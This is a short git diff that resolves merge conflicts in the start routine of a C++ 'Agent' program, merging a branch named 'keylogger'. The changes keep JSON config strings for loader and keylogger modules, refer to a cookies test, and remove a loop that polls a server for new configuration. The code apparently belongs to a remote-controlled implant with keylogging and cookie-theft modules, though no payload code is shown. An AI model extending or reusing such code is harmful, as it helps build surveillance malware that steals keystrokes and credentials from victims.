@@ -2,7 +2,6 @@
 
 void Agent::start()
 {
-<<<<<<< HEAD
     // ################################################
     // FOR MODULES DEBUGGING:
     // uncomment the next lines and change the debug_conf (should be in your ruuning dir)
@@ -23,7 +22,7 @@ void Agent::start()
     // start_from_config(config);
     // sleep(1000000);
     // ################################################
-=======
+
     std::string LOADER_TEST = R"(
     {
         "LOADER": 
@@ -35,7 +34,7 @@ void Agent::start()
         }
     }
     )";
->>>>>>> keylogger
+
 
 std::string keylogger_start = R"(
     {
@@ -46,20 +45,6 @@ std::string keylogger_start = R"(
             "file_content": ""
             }
         }
-<<<<<<< HEAD
-
-        sleep(5);
-    }
-
-    while (agent_run)
-    {
-        if(get_server_config())
-        {
-            start_from_config(config);
-        }
-        sleep(60 * 5);
-    }
-=======
     }
     )";
 
@@ -100,7 +85,6 @@ std::string cookies_test = R"(
     //     }
     //     sleep(60 * 5);
     // }
->>>>>>> keylogger
 }
 
 
